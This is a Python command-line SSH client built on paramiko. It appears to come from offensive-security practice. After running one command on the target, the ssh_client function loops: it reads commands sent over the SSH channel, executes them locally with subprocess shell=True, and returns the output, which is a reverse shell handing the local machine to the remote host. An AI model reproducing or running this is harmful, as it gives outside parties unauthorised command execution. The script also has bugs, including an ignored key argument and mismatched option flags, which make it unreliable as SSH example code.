import paramiko
from paramiko.channel import ChannelFile , ChannelStderrFile
import sys
import subprocess
import getopt

def usage():
    print('Usage: ssh_client.py  <IP> -p <PORT> -u <USER> -c <COMMAND> -a <PASSWORD> -k <KEY> -c <COMMAND>')
    print('-a                  password authentication')
    print('-i                  identity file location')
    print('-c                  command to be issued')
    print('-p                  specify the port')
    print('-u                  specify the username')
    print()
    print('Examples:')
    print('ssh_client.py <IP> -u <USER> -p 22 -a <GOODPASS> -c pwd')

def ssh_client(ip, port, user, passwd, key, command):
    client = paramiko.SSHClient()
    if key:
        client.load_host_keys(filename='mykey.pem')
    else:
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        (stdin,stdout,stderr) = ssh_session.exec_command(command)
        # print(ssh_session.recv(4096))
        print(stdout.read())
        while 1:
            command = ssh_session.recv(4096)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
                break
        client.close()

def main():
    if not len(sys.argv[1:]):
        usage()
    IP = 'localhost'
    USER = ''
    PASSWORD = ''
    KEY = ''
    COMMAND = ''
    PORT = 0
    try:
        opts = getopt.getopt(sys.argv[2:],"p:u:a:i:c:", \
            ['PORT', 'USER', 'PASSWORD', 'KEY', 'COMMAND'])[0]
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    IP = sys.argv[1]
    print(f'[*] Initializing connection to {IP}')
    # Handle the options and arguments. 
    # TODO: add KeyError error handler.
    for t in opts:
        if t[0] in ('-a'):
            PASSWORD = t[1]
        elif t[0] in ('-i'):
            KEY = t[1]
        elif t[0] in ('-c'):
            COMMAND = t[1]
        elif t[0] in ('-p'):
            PORT = int(t[1])
        elif t[0] in ('-u'):
            USER = t[1]
        else:
            print('This option does not exist!')
            usage()
        
    if USER:
        print(f'[*] User set to {USER}')
    if PORT:
        print(f'[*] The port to be used is {PORT}')
    if PASSWORD:
        print(f'[*] Password length {len(PASSWORD)} was submitted.')
    if KEY:
        print(f'[*] The key at {KEY} will be used.')
    if COMMAND:
        print(f'[*] Executing the command {COMMAND} in the host...')
    else:
        print('You need to specify the command to the host.')
        usage()
    # Start the client.
    ssh_client(IP, PORT, USER, PASSWORD, KEY, COMMAND)

if __name__ == '__main__':
    main()